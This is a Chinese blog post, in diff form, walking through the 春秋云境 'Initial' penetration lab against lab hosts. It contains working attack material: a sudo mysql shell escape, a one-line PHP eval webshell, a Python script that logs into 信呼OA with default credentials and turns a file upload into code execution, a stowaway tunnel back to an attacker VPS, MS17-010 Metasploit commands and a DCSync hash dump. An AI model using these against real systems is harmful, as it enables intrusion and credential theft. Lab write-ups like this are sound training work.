@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="tp漏洞rce 上蚁剑 find &#x2F; -user root -perm -4000 -print 2&gt; result.txt  suid提权没有，尝试sudo 发现mysql命令 提权命令 https:&#x2F;&#x2F;www.huangmj.com&#x2F;17116743651246.html#36-sudo-mysql 查看文件名带flag的文件 1sudo mysql -e &#x27;\! f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Initial">
+<meta property="og:url" content="https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="tp漏洞rce 上蚁剑 find &#x2F; -user root -perm -4000 -print 2&gt; result.txt  suid提权没有，尝试sudo 发现mysql命令 提权命令 https:&#x2F;&#x2F;www.huangmj.com&#x2F;17116743651246.html#36-sudo-mysql 查看文件名带flag的文件 1sudo mysql -e &#x27;\! f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234482347-cdd9bc09-4cd0-4df2-bc3f-2311a57be31e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234587677-742f1d77-c0b4-42e9-9ba8-1f01915eba7d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234708830-8a13ee63-03ba-4500-a518-1abc1f94953a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235072247-9d0b560e-1bcb-45ae-9c8f-e81d4a13fd38.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235032844-2b3ef0e7-afc6-4712-b280-9f9f1ade5c55.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235174837-6446d7ac-8daf-414f-b707-c11c420284c6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236043329-96883d9a-829b-4821-bc7a-e026e62572fe.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235555816-d9470307-455e-44bf-9cd7-85863d8e6ff5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235759771-7fc947e0-fe10-42b6-8d06-5153b5b3dc15.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235856262-1a3ad930-13d1-48b8-a5fc-d8d95001f68a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235938760-398edb79-bab7-40b2-b777-f56cf7e2590d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236094331-cf88ea53-321d-47f0-b7b4-753aeb974e67.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236798106-eb97002a-7eb3-4451-9964-0f851bdd337c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741237136731-4cbdf52c-963f-43c8-8ebf-8b8e5cab06ab.png">
+<meta property="article:published_time" content="2024-12-08T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-07T01:36:36.117Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234482347-cdd9bc09-4cd0-4df2-bc3f-2311a57be31e.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Initial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/28/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E9%89%B4%E6%9D%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&text=春秋云境-Initial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&is_video=false&description=春秋云境-Initial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Initial&body=Check out this article: https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&name=春秋云境-Initial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&t=春秋云境-Initial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tp%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.</span> <span class="toc-text">tp漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">2.</span> <span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">3.</span> <span class="toc-text">DCSync</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Initial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-08T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-12-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="tp漏洞rce"><a href="#tp漏洞rce" class="headerlink" title="tp漏洞rce"></a>tp漏洞rce</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234482347-cdd9bc09-4cd0-4df2-bc3f-2311a57be31e.png"></p>
+<p>上蚁剑</p>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt; result.txt</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234587677-742f1d77-c0b4-42e9-9ba8-1f01915eba7d.png"></p>
+<p>suid提权没有，尝试sudo</p>
+<p>发现mysql命令</p>
+<p>提权命令</p>
+<p><a target="_blank" rel="noopener" href="https://www.huangmj.com/17116743651246.html#36-sudo-mysql">https://www.huangmj.com/17116743651246.html#36-sudo-mysql</a></p>
+<p>查看文件名带flag的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234708830-8a13ee63-03ba-4500-a518-1abc1f94953a.png"></p>
+<p>读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>提示下一个在内网中，</p>
+<p>vps起个服务，wget下个fscan扫一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235072247-9d0b560e-1bcb-45ae-9c8f-e81d4a13fd38.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235032844-2b3ef0e7-afc6-4712-b280-9f9f1ade5c55.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235174837-6446d7ac-8daf-414f-b707-c11c420284c6.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[2025-03-06 12:25:54] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-06 12:25:54] [INFO] CIDR范围: 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 解析CIDR 172.22.1.15/24 -&gt; IP范围 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:26:00] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-03-06 12:26:00] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:88</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.15:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.15:22</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:389</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:3306</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] 服务识别 172.22.1.15:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] 服务识别 172.22.1.18:3306 =&gt; [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server]</span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] 服务识别 172.22.1.2:88 =&gt; </span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] 服务识别 172.22.1.18:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.21:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.18:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.21:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.15:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.18:139 =&gt;  Banner:[.]</span><br></pre></td></tr></table></figure>
+
+<p>看到1.18的80端口开放，搭个socks代理</p>
+<p>stowaway代理搭建<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236043329-96883d9a-829b-4821-bc7a-e026e62572fe.png"></p>
+<p>vps：</p>
+<p>.&#x2F;linux_x64_admin –heartbeat -l 61032 -s aab32</p>
+<p>在被控端（shell机器）启动：</p>
+<p>.&#x2F;linux_x64_agent -c &lt;VPS IP地址&gt;:61032 -s aab32</p>
+<p>建立连接后，在服务端选中上线的节点，并且执行socks命令即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks 端口 用户名 密码</span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure>
+
+<p>此时使用 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 就可以代理到被控端的内网了。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235555816-d9470307-455e-44bf-9cd7-85863d8e6ff5.png"></p>
+<p>kali配置好socks代理后，创建poc目录，脚本同目录放一个1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line">print(id)</span><br><span class="line">print(filepath)</span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>然后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 poc.py </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235759771-7fc947e0-fe10-42b6-8d06-5153b5b3dc15.png"></p>
+<p>打印出来的就马</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235856262-1a3ad930-13d1-48b8-a5fc-d8d95001f68a.png"></p>
+<p>上蚁剑，记得配置代理</p>
+<p>管理员目录下找到flag</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235938760-398edb79-bab7-40b2-b777-f56cf7e2590d.png"></p>
+<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>这边fscan高版本有点问题，换个低版本的</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236094331-cf88ea53-321d-47f0-b7b4-753aeb974e67.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2   DC域控</span><br><span class="line">172.22.1.21  MS17-010永恒之蓝</span><br><span class="line">172.22.1.18  信呼OA系统</span><br></pre></td></tr></table></figure>
+
+<p>看到ms17-010</p>
+<p>kali上msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>直接尝试访问本地用户目录没有找到flag，这边猜测需要域用户访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236798106-eb97002a-7eb3-4451-9964-0f851bdd337c.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">拿到权限后可以用creds_all等命令收集内网凭据，而我们控制的这台机器是有DCSync的权限的(因为这个是DC1，也就是域控制器), 所以能直接从域控上导出Hash</span><br><span class="line"></span><br><span class="line">DCSync攻击:</span><br><span class="line">DCSync的原理是利用域控制器之间的数据同步复制</span><br><span class="line">DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据，由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式</span><br><span class="line"></span><br><span class="line">DCSync 攻击前提:</span><br><span class="line"></span><br><span class="line">想进行DCSync 攻击，必须获得以下任一用户的权限：</span><br><span class="line">Administrators 组内的用户</span><br><span class="line">Domain Admins 组内的用户</span><br><span class="line">Enterprise Admins 组内的用户域控制器的计算机帐户</span><br><span class="line">即：默认情况下域管理员组具有该权限</span><br><span class="line"></span><br><span class="line">这里我们用永恒之蓝打完本来就是system权限，然后我们load kiwi，抓取用户的hash</span><br></pre></td></tr></table></figure>
+
